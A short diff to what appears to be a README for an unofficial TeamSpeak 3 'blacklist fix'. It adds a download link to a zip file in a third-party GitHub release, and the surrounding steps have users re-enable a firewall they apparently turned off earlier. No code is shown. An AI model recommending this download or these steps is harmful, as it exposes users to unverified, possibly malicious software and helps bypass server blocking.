@@ -24,7 +24,7 @@ This server is blacklisted. Refusing to connect.
 4.  **Restart TeamSpeak 3** after completing the steps.
 5.  **Re-enable your firewall.**
 
-   TS3-BlackList-WinXP-7-8-8.1-32-64Bit: Download
+   TS3-BlackList-WinXP-7-8-8.1-32-64Bit: [Download](https://github.com/ThyArt-IsMurder/Teamspeak-blacklist-fix/releases/download/v2025/TS3-BlackList-Fix.zip)
 
 ### For Windows 10,11 (64-bit):
 
